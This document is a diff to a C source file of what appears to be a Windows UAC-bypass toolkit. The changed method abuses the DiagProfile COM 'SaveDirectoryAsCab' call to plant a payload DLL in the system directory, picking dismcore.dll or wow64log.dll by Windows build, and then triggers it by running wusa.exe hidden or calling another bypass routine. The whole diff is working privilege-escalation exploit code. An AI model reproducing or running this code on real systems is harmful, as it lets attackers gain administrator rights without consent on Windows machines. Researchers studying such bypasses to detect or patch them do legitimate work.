@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2025
+*  (C) COPYRIGHT AUTHORS, 2020 - 2026
 *
 *  TITLE:       ZCGONVH.C
 *
-*  VERSION:     3.69
+*  VERSION:     3.70
 *
-*  DATE:        12 Dec 2025
+*  DATE:        07 May 2026
 *
 *  UAC bypass methods based on zcgonvh original work.
 *
@@ -372,7 +372,8 @@ DWORD ucmxOverwriteThread(
 *
 */
 HRESULT ucmxTriggerDiagProfile(
-    _In_ LPCWSTR lpDirectory
+    _In_ LPCWSTR lpDirectory,
+    _In_ LPCWSTR lpPayloadName
 )
 {
     HRESULT r = E_FAIL;
@@ -395,7 +396,7 @@ HRESULT ucmxTriggerDiagProfile(
     values[1].bstrVal = NULL;
 
     do {
-        
+
         methodName = SysAllocString(L"SaveDirectoryAsCab");
         if (methodName == NULL)
             break;
@@ -452,7 +453,7 @@ HRESULT ucmxTriggerDiagProfile(
         VariantInit(&values[1]);
 
         _strcpy(szTarget, g_ctx->szSystemDirectory);
-        _strcat(szTarget, WOW64LOG_DLL);
+        _strcat(szTarget, lpPayloadName);
 
         values[0].vt = VT_BSTR;
         values[0].bstrVal = SysAllocString(szTarget);
@@ -531,6 +532,7 @@ NTSTATUS ucmVFServerDiagProfileMethod(
     DWORD dwLastError;
     ULONG retryCount = 0;
 
+    LPWSTR lpPayloadName;
     UCMX_OVP* ovParams = NULL;
 
     WCHAR szBuffer[MAX_PATH * 2];
@@ -574,7 +576,9 @@ NTSTATUS ucmVFServerDiagProfileMethod(
 
         SetThreadPriority(OverwriteThreadHandle, THREAD_PRIORITY_TIME_CRITICAL);
 
-        r = ucmxTriggerDiagProfile(szBuffer);
+        lpPayloadName = (g_ctx->dwBuildNumber > NT_WIN11_21H2) ? DISMCORE_DLL : WOW64LOG_DLL;
+
+        r = ucmxTriggerDiagProfile(szBuffer, lpPayloadName);
         if (FAILED(r)) {
             ucmConsolePrintValueUlong(TEXT("[!] DiagProfile does not trigger\r\n"), r, TRUE);
             break;
@@ -583,7 +587,7 @@ NTSTATUS ucmVFServerDiagProfileMethod(
         _InterlockedExchange((LONG*)&TerminateOverwriteThread, TRUE);
 
         _strcpy(szBuffer, g_ctx->szSystemDirectory);
-        _strcat(szBuffer, WOW64LOG_DLL);
+        _strcat(szBuffer, lpPayloadName);
 
         do {
 
@@ -596,18 +600,23 @@ NTSTATUS ucmVFServerDiagProfileMethod(
 
         } while (++retryCount < 10);
 
-        _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
-        _strcat(szBuffer, SYSWOW64_DIR);
-        _strcat(szBuffer, WUSA_EXE);
+        if (g_ctx->dwBuildNumber > NT_WIN11_21H2) {
+            MethodResult = ucmDisemerMethod();
+        }
+        else {
+            _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
+            _strcat(szBuffer, SYSTEM32_DIR);
+            _strcat(szBuffer, WUSA_EXE);
 
-        if (supRunProcess2(szBuffer,
-            NULL,
-            NULL,
-            SW_HIDE,
-            5000))
-        {
-            ucmConsolePrint(TEXT("[+] Target executed\r\n"));
-            MethodResult = STATUS_SUCCESS;
+            if (supRunProcess2(szBuffer,
+                NULL,
+                NULL,
+                SW_HIDE,
+                5000))
+            {
+                ucmConsolePrint(TEXT("[+] Target executed\r\n"));
+                MethodResult = STATUS_SUCCESS;
+            }
         }
 
     } while (FALSE);
